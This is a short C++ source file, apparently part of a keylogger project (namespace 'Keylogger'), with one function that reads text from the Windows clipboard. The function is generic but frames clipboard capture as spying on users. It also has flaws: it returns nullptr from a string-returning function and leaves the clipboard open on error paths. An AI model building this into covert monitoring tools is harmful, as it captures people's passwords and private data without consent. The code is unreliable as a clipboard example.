#include "ClipboardHandlerWindows.h"

#include <windows.h>

namespace Keylogger {

std::string ClipboardHandlerWindows::getClipboardString() {
    if (!OpenClipboard(nullptr))
        return nullptr;

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
        return nullptr;

    char* chtext = static_cast<char*>(GlobalLock(hData));
    if (chtext == nullptr)
        return nullptr;

    std::string text(chtext);

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}

}
